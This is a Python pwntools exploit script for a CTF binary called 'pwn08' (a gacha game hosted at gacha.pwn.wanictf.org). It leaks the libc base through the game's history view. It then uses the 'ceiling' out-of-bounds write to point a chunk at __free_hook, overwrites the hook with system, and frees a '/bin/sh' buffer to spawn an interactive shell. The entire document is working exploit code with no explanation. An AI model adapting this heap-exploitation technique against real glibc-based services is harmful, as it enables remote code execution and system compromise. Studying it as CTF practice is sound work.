#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    # s = process('./ld-2.31.so ./pwn08', shell=True, env={ 'LD_PRELOAD': './libc-2.31.so' })
    s = process('./pwn08')
else:
    s = remote('gacha.pwn.wanictf.org', 9008)

def do_gacha(count):
    s.sendlineafter('>', '1')
    s.sendlineafter('times? :', str(count))

def view():
    s.sendlineafter('>', '2')
    s.recvline()
    history = []
    while True:
        line = s.recvline(False)
        if line.endswith(b'Gacha'):
            history.append(list(map(lambda x: int(x[1:-1], 0x10), s.recvline(False).split(b' ')[:-1])))
        elif line == b'':
            break
        else:
            history.append([])
    return history

def clear():
    s.sendlineafter('>', '3')

def ceiling(row, col, value):
    s.sendlineafter('>', '4')
    s.sendlineafter('>', str(row))
    s.sendlineafter('>', str(col))
    s.sendlineafter('>', str(value))

def ceiling64(row, col, value):
    ceiling(row, col, value % (1<<32))
    ceiling(row, col + 1, value >> 32)

libc = ELF('./libc-2.31.so')

do_gacha(6)
do_gacha(6)
do_gacha(1400)
do_gacha(6)
clear()
do_gacha(6)
history = view()
libc.address = (history[4][2] << 32) + history[4][3] - 0x1ebbe0
log.info('libc base: %#x' % libc.address)

ceiling64(1, 0, libc.symbols['__free_hook'] - 8)

do_gacha(6)
do_gacha(8)
for i in range(3):
    do_gacha(6)

ceiling64(2, 0, u64('/bin/sh\0'))
ceiling64(2, 2, libc.symbols['system'])
clear()

s.interactive()
